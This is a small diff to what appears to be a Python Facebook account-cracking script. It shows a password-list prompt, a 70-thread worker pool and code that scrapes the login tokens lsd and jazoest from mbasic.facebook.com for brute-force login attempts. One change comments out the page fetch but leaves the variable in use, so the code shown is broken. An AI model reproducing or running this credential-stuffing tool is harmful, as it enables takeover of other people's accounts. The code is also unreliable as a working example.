@@ -1438,7 +1438,7 @@ def chos():
     print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
     lines()
     for bilal in range(passx):
-        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
+        pww = input(f"[•]  ENTER PASSWORDS {bilal+1} : ")
         HamiiID.append(pww)
     with ThreadPool(max_workers=70) as manshera:
         os.system('clear')
@@ -1467,7 +1467,7 @@ def fcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+          #  free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
